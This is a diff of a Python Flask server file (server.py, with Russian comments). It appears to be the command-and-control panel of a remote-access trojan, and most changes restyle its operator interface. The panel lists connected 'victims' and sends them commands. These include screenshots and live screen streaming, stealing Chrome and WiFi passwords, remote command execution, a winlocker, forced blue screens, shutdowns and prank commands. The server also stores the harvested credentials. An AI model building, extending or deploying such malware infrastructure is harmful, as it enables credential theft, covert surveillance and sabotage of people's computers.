@@ -1,6 +1,6 @@
 # =====================================================================
-# СЕРВЕР С ПРИКОЛЬНЫМИ ФУНКЦИЯМИ
-# Замени server.py на GitHub
+# СЕРВЕР - СТАБИЛЬНЫЙ И КРАСИВЫЙ
+# Замени server.py на GitHub полностью
 # =====================================================================
 from flask import Flask, request, jsonify
 import time
@@ -55,7 +55,6 @@ def receive_data(client_id):
     if client_id in clients:
         data = request.json
         data_type = data.get("type")
-        
         if data_type in ["screenshot", "stream_frame"]:
             clients[client_id]["last_screenshot"] = data.get("data", "")
         elif data_type == "sysinfo":
@@ -66,7 +65,6 @@ def receive_data(client_id):
             clients[client_id]["wifi_data"] = data.get("data", "")
         elif data_type == "exec_result":
             clients[client_id]["exec_result"] = data.get("data", "")
-        
         clients[client_id]["last_seen"] = time.time()
     return jsonify({"status": "ok"})
 
@@ -75,7 +73,7 @@ def get_screenshot(client_id):
     if client_id in clients and clients[client_id].get("last_screenshot"):
         try:
             img_data = base64.b64decode(clients[client_id]["last_screenshot"])
-            return img_data, 200, {'Content-Type': 'image/jpeg', 'Cache-Control': 'no-cache'}
+            return img_data, 200, {'Content-Type': 'image/jpeg', 'Cache-Control': 'no-cache, no-store, must-revalidate'}
         except:
             pass
     return "no", 404
@@ -123,121 +121,417 @@ def get_notifications():
 def home():
     return """
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
-    <title>Control Panel v3.0 - FUNNY MODE</title>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Control Panel v3.0</title>
     <style>
+        :root {
+            --bg: #0d1117;
+            --panel: #161b22;
+            --border: #30363d;
+            --accent: #58a6ff;
+            --green: #3fb950;
+            --red: #f85149;
+            --orange: #d2991d;
+            --text: #c9d1d9;
+            --text2: #8b949e;
+            --radius: 6px;
+        }
+        
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
-        @keyframes slideIn { from { opacity: 0; transform: translateX(-20px); } to { opacity: 1; transform: translateX(0); } }
-        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(79,195,247,0.4); } 70% { box-shadow: 0 0 0 10px rgba(79,195,247,0); } 100% { box-shadow: 0 0 0 0 rgba(79,195,247,0); } }
-        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
-        @keyframes rainbow { 0% { color: #ff0000; } 14% { color: #ff8800; } 28% { color: #ffff00; } 42% { color: #00ff00; } 57% { color: #0088ff; } 71% { color: #0000ff; } 85% { color: #8800ff; } 100% { color: #ff0000; } }
-        @keyframes shake { 0%,100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
         
-        body { background: #0a0e14; color: #c9d1d9; font-family: 'Segoe UI', system-ui; height: 100vh; display: flex; overflow: hidden; }
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+            font-size: 14px;
+            line-height: 1.5;
+            height: 100vh;
+            display: flex;
+        }
         
-        .sidebar { width: 280px; background: #111922; border-right: 1px solid #1e2d3d; display: flex; flex-direction: column; animation: slideIn 0.5s ease; }
-        .sidebar-header { padding: 20px; background: linear-gradient(135deg, #1a2733, #111922); border-bottom: 1px solid #1e2d3d; }
-        .sidebar-header h2 { color: #4fc3f7; font-size: 18px; font-weight: 700; }
-        .sidebar-header .status { color: #81c784; font-size: 11px; margin-top: 5px; display: flex; align-items: center; gap: 6px; }
-        .status-dot { width: 8px; height: 8px; background: #81c784; border-radius: 50%; animation: pulse 2s infinite; }
+        /* Sidebar */
+        .sidebar {
+            width: 260px;
+            background: var(--panel);
+            border-right: 1px solid var(--border);
+            display: flex;
+            flex-direction: column;
+            flex-shrink: 0;
+        }
         
-        .notifications { max-height: 150px; overflow-y: auto; padding: 10px; }
-        .notification { background: #0d1520; padding: 10px 12px; margin-bottom: 6px; border-radius: 6px; font-size: 11px; color: #81c784; border-left: 3px solid #81c784; animation: fadeIn 0.3s ease; }
-        .notification .time { color: #4fc3f7; font-size: 9px; }
+        .sidebar-header {
+            padding: 16px;
+            border-bottom: 1px solid var(--border);
+        }
         
-        .client-list { flex: 1; overflow-y: auto; padding: 10px; }
-        .client-item { background: #0d1520; border: 2px solid #1e2d3d; border-radius: 10px; padding: 14px; margin-bottom: 8px; cursor: pointer; transition: all 0.3s ease; animation: fadeIn 0.4s ease; }
-        .client-item:hover { border-color: #4fc3f7; transform: translateX(5px); background: #111d2b; }
-        .client-item.active { border-color: #4fc3f7; background: #111d2b; }
-        .client-item .name { color: #4fc3f7; font-weight: 600; font-size: 14px; display: flex; align-items: center; gap: 8px; }
-        .client-item .info { color: #8b949e; font-size: 10px; margin-top: 4px; line-height: 1.5; }
-        .dot { width: 8px; height: 8px; background: #81c784; border-radius: 50%; animation: pulse 2s infinite; }
+        .sidebar-header h1 {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--accent);
+        }
         
-        .main-content { flex: 1; display: flex; flex-direction: column; }
+        .sidebar-header .status {
+            font-size: 12px;
+            color: var(--green);
+            margin-top: 4px;
+        }
         
-        .toolbar { background: #111922; padding: 12px 20px; display: flex; gap: 6px; flex-wrap: wrap; border-bottom: 1px solid #1e2d3d; }
-        .toolbar button { background: #1a2733; color: #4fc3f7; border: 1px solid #2d3a4a; padding: 7px 12px; border-radius: 8px; cursor: pointer; font-size: 11px; font-weight: 500; transition: all 0.3s ease; }
-        .toolbar button:hover { background: #4fc3f7; color: #0f1923; border-color: #4fc3f7; transform: translateY(-2px); }
-        .toolbar button:active { transform: scale(0.95); }
-        .toolbar button.danger { color: #ef5350; border-color: #ef5350; }
-        .toolbar button.danger:hover { background: #ef5350; color: #fff; }
-        .toolbar button.green { color: #81c784; border-color: #81c784; }
-        .toolbar button.green:hover { background: #81c784; color: #0f1923; }
-        .toolbar button.funny { color: #ffaa00; border-color: #ffaa00; animation: shake 0.5s infinite; }
-        .toolbar button.funny:hover { background: #ffaa00; color: #000; animation: none; }
-        .toolbar button.rainbow { animation: rainbow 3s infinite; border-color: #ffaa00; }
-        .toolbar button.rainbow:hover { background: #fff; animation: none; }
+        .notifications {
+            max-height: 120px;
+            overflow-y: auto;
+            padding: 8px;
+            border-bottom: 1px solid var(--border);
+        }
         
-        .content-area { flex: 1; display: flex; padding: 10px; gap: 10px; overflow: hidden; }
+        .notification {
+            background: var(--bg);
+            padding: 8px;
+            margin-bottom: 4px;
+            border-radius: var(--radius);
+            font-size: 11px;
+            border-left: 3px solid var(--green);
+        }
         
-        .panel { background: #111922; border-radius: 12px; border: 1px solid #1e2d3d; }
-        .screenshot-panel { flex: 1; display: flex; align-items: center; justify-content: center; overflow: hidden; }
-        .screenshot-panel img { max-width: 100%; max-height: 100%; object-fit: contain; }
-        .placeholder { color: #3a4a5a; font-size: 16px; text-align: center; }
+        .notification .time {
+            color: var(--text2);
+            font-size: 10px;
+        }
         
-        .info-panel { width: 380px; padding: 20px; overflow-y: auto; }
-        .info-panel h3 { color: #4fc3f7; font-size: 14px; margin-bottom: 10px; margin-top: 15px; }
-        .info-panel h3:first-child { margin-top: 0; }
-        .info-row { display: flex; padding: 6px 0; border-bottom: 1px solid #1a2733; font-size: 12px; }
-        .info-label { color: #8b949e; width: 100px; flex-shrink: 0; font-weight: 500; }
-        .info-value { color: #e6edf3; }
-        pre { background: #0a0e14; padding: 12px; border-radius: 8px; font-size: 11px; color: #81c784; white-space: pre-wrap; max-height: 200px; overflow-y: auto; border: 1px solid #1e2d3d; }
+        .client-list {
+            flex: 1;
+            overflow-y: auto;
+            padding: 8px;
+        }
         
-        .console-panel { width: 320px; background: #0a0e14; display: flex; flex-direction: column; }
-        .console-header { padding: 10px 15px; font-size: 12px; color: #4fc3f7; border-bottom: 1px solid #1e2d3d; font-weight: 600; }
-        .console-output { flex: 1; overflow-y: auto; padding: 10px; font-family: 'Consolas', monospace; font-size: 11px; color: #81c784; }
-        .console-input { display: flex; border-top: 1px solid #1e2d3d; }
-        .console-input input { flex: 1; background: #0a0e14; border: none; color: #81c784; padding: 10px; font-family: 'Consolas', monospace; font-size: 11px; outline: none; }
-        .console-input button { background: #4fc3f7; color: #0a0e14; border: none; padding: 10px 16px; cursor: pointer; font-weight: 700; }
+        .client-item {
+            padding: 12px;
+            margin-bottom: 4px;
+            border-radius: var(--radius);
+            cursor: pointer;
+            border: 1px solid transparent;
+            transition: all 0.15s ease;
+        }
         
-        .section-title { color: #ffaa00; font-size: 11px; font-weight: 600; margin: 8px 0 4px 0; }
+        .client-item:hover {
+            background: #1c2128;
+        }
         
-        ::-webkit-scrollbar { width: 6px; }
-        ::-webkit-scrollbar-track { background: #0a0e14; }
-        ::-webkit-scrollbar-thumb { background: #1e2d3d; border-radius: 3px; }
+        .client-item.active {
+            border-color: var(--accent);
+            background: #1c2128;
+        }
+        
+        .client-item .hostname {
+            font-weight: 600;
+            color: var(--accent);
+            font-size: 13px;
+        }
+        
+        .client-item .meta {
+            font-size: 11px;
+            color: var(--text2);
+            margin-top: 2px;
+        }
+        
+        .client-item .dot {
+            display: inline-block;
+            width: 6px;
+            height: 6px;
+            background: var(--green);
+            border-radius: 50%;
+            margin-right: 6px;
+        }
+        
+        /* Main */
+        .main-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            min-width: 0;
+        }
+        
+        .toolbar {
+            padding: 10px 16px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            gap: 4px;
+            flex-wrap: wrap;
+            background: var(--panel);
+        }
+        
+        .toolbar button {
+            padding: 5px 12px;
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            background: var(--bg);
+            color: var(--text);
+            font-size: 12px;
+            cursor: pointer;
+            white-space: nowrap;
+            transition: all 0.15s ease;
+        }
+        
+        .toolbar button:hover {
+            background: #30363d;
+        }
+        
+        .toolbar button.green {
+            color: var(--green);
+            border-color: var(--green);
+        }
+        
+        .toolbar button.green:hover {
+            background: var(--green);
+            color: #000;
+        }
+        
+        .toolbar button.red {
+            color: var(--red);
+            border-color: var(--red);
+        }
+        
+        .toolbar button.red:hover {
+            background: var(--red);
+            color: #fff;
+        }
+        
+        .toolbar button.funny {
+            color: var(--orange);
+            border-color: var(--orange);
+        }
+        
+        .toolbar button.funny:hover {
+            background: var(--orange);
+            color: #000;
+        }
+        
+        .separator {
+            width: 100%;
+            height: 1px;
+            background: var(--border);
+            margin: 4px 0;
+        }
+        
+        .section-label {
+            width: 100%;
+            font-size: 10px;
+            color: var(--orange);
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            padding: 2px 0;
+        }
+        
+        /* Content */
+        .content-area {
+            flex: 1;
+            display: flex;
+            padding: 8px;
+            gap: 8px;
+            overflow: hidden;
+        }
+        
+        .panel {
+            background: var(--panel);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+        }
+        
+        .screenshot-panel {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            min-width: 0;
+        }
+        
+        .screenshot-panel img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+        }
+        
+        .placeholder {
+            color: var(--text2);
+            font-size: 14px;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .info-panel {
+            width: 350px;
+            flex-shrink: 0;
+            padding: 16px;
+            overflow-y: auto;
+        }
+        
+        .info-panel h3 {
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--accent);
+            margin-bottom: 8px;
+            margin-top: 16px;
+        }
+        
+        .info-panel h3:first-child {
+            margin-top: 0;
+        }
+        
+        .info-row {
+            display: flex;
+            padding: 3px 0;
+            font-size: 12px;
+        }
+        
+        .info-label {
+            color: var(--text2);
+            width: 90px;
+            flex-shrink: 0;
+        }
+        
+        .info-value {
+            color: var(--text);
+            word-break: break-all;
+        }
+        
+        pre {
+            background: var(--bg);
+            padding: 8px;
+            border-radius: var(--radius);
+            font-size: 11px;
+            color: var(--green);
+            white-space: pre-wrap;
+            max-height: 180px;
+            overflow-y: auto;
+            font-family: 'SF Mono', 'Consolas', monospace;
+        }
+        
+        .console-panel {
+            width: 300px;
+            flex-shrink: 0;
+            background: #0d1117;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .console-header {
+            padding: 8px 12px;
+            font-size: 11px;
+            font-weight: 600;
+            color: var(--accent);
+            border-bottom: 1px solid var(--border);
+        }
+        
+        .console-output {
+            flex: 1;
+            overflow-y: auto;
+            padding: 8px;
+            font-family: 'SF Mono', 'Consolas', monospace;
+            font-size: 11px;
+            color: var(--green);
+        }
+        
+        .console-input {
+            display: flex;
+            border-top: 1px solid var(--border);
+        }
+        
+        .console-input input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            color: var(--text);
+            padding: 8px 12px;
+            font-family: 'SF Mono', 'Consolas', monospace;
+            font-size: 12px;
+            outline: none;
+        }
+        
+        .console-input button {
+            background: var(--accent);
+            color: #000;
+            border: none;
+            padding: 8px 14px;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 11px;
+        }
+        
+        .console-input button:hover {
+            background: var(--green);
+        }
+        
+        .log-entry {
+            font-size: 10px;
+            padding: 1px 0;
+        }
+        
+        .log-entry .time {
+            color: var(--accent);
+            margin-right: 6px;
+        }
+        
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 6px;
+            height: 6px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: transparent;
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: var(--border);
+            border-radius: 3px;
+        }
+        
+        ::-webkit-scrollbar-thumb:hover {
+            background: #484f58;
+        }
     </style>
 </head>
 <body>
     <div class="sidebar">
         <div class="sidebar-header">
-            <h2>⬡ CONTROL PANEL v3.0</h2>
-            <div class="status"><span class="status-dot"></span> Server Online</div>
+            <h1>Control Panel v3.0</h1>
+            <div class="status">● Server Online</div>
         </div>
         <div class="notifications" id="notifications"></div>
         <div class="client-list" id="clientList">
-            <div class="placeholder">Waiting for victims...</div>
+            <div class="placeholder">Waiting...</div>
         </div>
     </div>
     
     <div class="main-content">
-        <div class="toolbar">
+        <div class="toolbar" id="toolbar">
             <button onclick="sendCmd('screenshot')">📸 Screenshot</button>
             <button class="green" onclick="startStream()">📡 Stream</button>
-            <button class="danger" onclick="stopStream()">⏹ Stop</button>
-            <button onclick="sendCmd('sysinfo')">💻 SysInfo</button>
+            <button class="red" onclick="stopStream()">⏹ Stop</button>
+            <button onclick="sendCmd('sysinfo')">💻 Info</button>
             <button onclick="sendCmd('steal_chrome')">🔑 Chrome</button>
             <button onclick="sendCmd('steal_wifi')">📶 WiFi</button>
             <button class="green" onclick="sendCmd('lock')">🔒 Lock</button>
             <button onclick="sendCmd('unlock')">🔓 Unlock</button>
-            <button class="danger" onclick="sendCmd('shutdown')">⏻ Off</button>
-            <button class="danger" onclick="sendCmd('restart')">🔄 Reboot</button>
+            <button class="red" onclick="sendCmd('shutdown')">⏻ Off</button>
+            <button class="red" onclick="sendCmd('restart')">🔄 Reboot</button>
             <button onclick="sendMsg()">💬 Msg</button>
-            <button class="danger" onclick="sendCmd('winlocker')">🚫 WinLock</button>
-            <button class="danger" onclick="sendCmd('bsod')">⚠ BSOD</button>
-            
-            <div class="section-title" style="width:100%">😂 FUNNY COMMANDS:</div>
-            
+            <button class="red" onclick="sendCmd('winlocker')">🚫 WinLock</button>
+            <button class="red" onclick="sendCmd('bsod')">⚠ BSOD</button>
+            <div class="separator"></div>
+            <div class="section-label">😂 Funny Commands</div>
             <button class="funny" onclick="sendCmd('funny_msg')">😂 Смешное окно</button>
             <button class="funny" onclick="sendCmd('crazy_screen')">🤪 Безумный экран</button>
             <button class="funny" onclick="sendCmd('crazy_mouse')">🖱 Мышь-псих</button>
             <button class="funny" onclick="sendCmd('rickroll')">🎵 RickRoll</button>
             <button class="funny" onclick="sendCmd('draw')">🎨 Рисовать</button>
             <button class="funny" onclick="sendCmd('beep')">🔊 Пищать</button>
-            <button class="funny" onclick="sendCmd('cdrom')">💿 Дисковод</button>
-            <button class="rainbow" onclick="sendCmd('type_funny')">⌨️ Печатать</button>
+            <button class="funny" onclick="sendCmd('cdrom')">💿 CD-ROM</button>
+            <button class="funny" onclick="sendCmd('type_funny')">⌨️ Печатать</button>
         </div>
         
         <div class="content-area">
@@ -245,23 +539,23 @@ def home():
                 <div class="placeholder">🖥 Select victim → Screenshot</div>
             </div>
             
-            <div class="panel info-panel" id="infoPanel">
+            <div class="panel info-panel">
                 <h3>💻 System Information</h3>
                 <div id="sysinfoContent"><div class="placeholder">Click SysInfo</div></div>
                 <h3>📄 Command Output</h3>
-                <pre id="execOutput">No commands</pre>
+                <pre id="execOutput"></pre>
                 <h3>🔑 Chrome Passwords</h3>
-                <pre id="chromeContent">Click Chrome</pre>
+                <pre id="chromeContent"></pre>
                 <h3>📶 WiFi Passwords</h3>
-                <pre id="wifiContent">Click WiFi</pre>
+                <pre id="wifiContent"></pre>
             </div>
             
             <div class="panel console-panel">
                 <div class="console-header">📋 Console</div>
                 <div class="console-output" id="console"></div>
                 <div class="console-input">
-                    <input type="text" id="cmdInput" placeholder="cmd..." onkeypress="if(event.key==='Enter')execCmd()">
-                    <button onclick="execCmd()">▶ RUN</button>
+                    <input type="text" id="cmdInput" placeholder="Type command..." onkeydown="if(event.key==='Enter')execCmd()">
+                    <button onclick="execCmd()">▶</button>
                 </div>
             </div>
         </div>
@@ -274,33 +568,39 @@ def home():
         function log(msg) {
             let t = new Date().toLocaleTimeString();
             let c = document.getElementById('console');
-            c.innerHTML += `<div class="log-entry"><span class="time">[${t}]</span>${msg}</div>`;
+            c.innerHTML += '<div class="log-entry"><span class="time">[' + t + ']</span>' + msg + '</div>';
             c.scrollTop = c.scrollHeight;
         }
         
         function updateAll() {
-            fetch('/clients').then(r => r.json()).then(data => {
-                let html = '';
-                for(let id in data) {
-                    let c = data[id];
-                    let active = selectedClient === id ? ' active' : '';
-                    html += `<div class="client-item${active}" onclick="selectClient('${id}')">
-                        <div class="name"><span class="dot"></span>${c.hostname}</div>
-                        <div class="info">👤 ${c.username}<br>🌐 ${c.ip}<br>📍 ${c.country}<br>💻 ${c.os}</div>
-                    </div>`;
+            fetch('/clients').then(function(r) { return r.json(); }).then(function(data) {
+                var html = '';
+                for(var id in data) {
+                    var c = data[id];
+                    var active = selectedClient === id ? ' active' : '';
+                    html += '<div class="client-item' + active + '" onclick="selectClient(\'' + id + '\')">';
+                    html += '<div class="hostname"><span class="dot"></span>' + c.hostname + '</div>';
+                    html += '<div class="meta">👤 ' + c.username + ' | 🌐 ' + c.ip + '</div>';
+                    html += '<div class="meta">📍 ' + c.country + ' | 💻 ' + c.os + '</div>';
+                    html += '</div>';
                 }
-                document.getElementById('clientList').innerHTML = html || '<div class="placeholder">No victims</div>';
+                document.getElementById('clientList').innerHTML = html || '<div class="placeholder">No victims connected</div>';
                 
                 if(selectedClient && data[selectedClient]) {
-                    let c = data[selectedClient];
+                    var c = data[selectedClient];
                     if(c.has_screenshot && streamInterval) {
-                        let img = document.getElementById('screenPanel').querySelector('img');
-                        if(img) img.src = `/screenshot/${selectedClient}?t=${Date.now()}`;
-                        else document.getElementById('screenPanel').innerHTML = `<img src="/screenshot/${selectedClient}">`;
+                        var img = document.getElementById('screenPanel').querySelector('img');
+                        if(img) {
+                            img.src = '/screenshot/' + selectedClient + '?t=' + Date.now();
+                        } else {
+                            document.getElementById('screenPanel').innerHTML = '<img src="/screenshot/' + selectedClient + '">';
+                        }
                     }
                     if(c.sysinfo && Object.keys(c.sysinfo).length > 0) {
-                        let h = '';
-                        for(let k in c.sysinfo) h += `<div class="info-row"><span class="info-label">${k}:</span><span class="info-value">${c.sysinfo[k]}</span></div>`;
+                        var h = '';
+                        for(var k in c.sysinfo) {
+                            h += '<div class="info-row"><span class="info-label">' + k + ':</span><span class="info-value">' + c.sysinfo[k] + '</span></div>';
+                        }
                         document.getElementById('sysinfoContent').innerHTML = h;
                     }
                     if(c.chrome_data) document.getElementById('chromeContent').textContent = c.chrome_data;
@@ -309,38 +609,49 @@ def home():
                 }
             });
             
-            fetch('/notifications').then(r => r.json()).then(data => {
-                let h = '';
-                data.reverse().forEach(n => h += `<div class="notification"><div>${n.text}</div><div class="time">${n.time}</div></div>`);
+            fetch('/notifications').then(function(r) { return r.json(); }).then(function(data) {
+                var h = '';
+                for(var i = data.length - 1; i >= 0; i--) {
+                    h += '<div class="notification"><div>' + data[i].text + '</div><div class="time">' + data[i].time + '</div></div>';
+                }
                 document.getElementById('notifications').innerHTML = h;
             });
         }
         
         function selectClient(id) {
             selectedClient = id;
-            log(`Selected: ${id}`);
-            document.querySelectorAll('.client-item').forEach(el => el.classList.remove('active'));
+            log('Selected: ' + id);
+            var items = document.querySelectorAll('.client-item');
+            for(var i = 0; i < items.length; i++) {
+                items[i].classList.remove('active');
+            }
             event.target.closest('.client-item').classList.add('active');
             sendCmd('screenshot');
             setTimeout(updateAll, 2000);
         }
         
         function sendCmd(command) {
-            if(!selectedClient) { alert('Select victim!'); return; }
+            if(!selectedClient) {
+                alert('Select a victim first!');
+                return;
+            }
             fetch('/send_command/' + selectedClient, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({command: command})
             });
-            log(`Sent: ${command}`);
+            log('Sent: ' + command);
         }
         
         function startStream() {
-            if(!selectedClient) { alert('Select victim!'); return; }
+            if(!selectedClient) { alert('Select a victim first!'); return; }
             sendCmd('stream_start');
             log('📡 Stream started');
             if(streamInterval) clearInterval(streamInterval);
-            streamInterval = setInterval(() => { sendCmd('screenshot'); setTimeout(updateAll, 1500); }, 2000);
+            streamInterval = setInterval(function() {
+                sendCmd('screenshot');
+                setTimeout(updateAll, 1500);
+            }, 2000);
         }
         
         function stopStream() {
@@ -351,7 +662,7 @@ def home():
         }
         
         function execCmd() {
-            let cmd = document.getElementById('cmdInput').value;
+            var cmd = document.getElementById('cmdInput').value;
             if(cmd && selectedClient) {
                 sendCmd('exec');
                 fetch('/send_command/' + selectedClient, {
@@ -365,8 +676,8 @@ def home():
         }
         
         function sendMsg() {
-            if(!selectedClient) { alert('Select victim!'); return; }
-            let msg = prompt('Message:');
+            if(!selectedClient) { alert('Select a victim first!'); return; }
+            var msg = prompt('Enter message:');
             if(msg) {
                 sendCmd('message');
                 fetch('/send_command/' + selectedClient, {
@@ -379,7 +690,7 @@ def home():
         
         setInterval(updateAll, 2000);
         updateAll();
-        log('🚀 Panel ready - FUNNY MODE activated! 😂');
+        log('Control Panel v3.0 ready');
     </script>
 </body>
 </html>
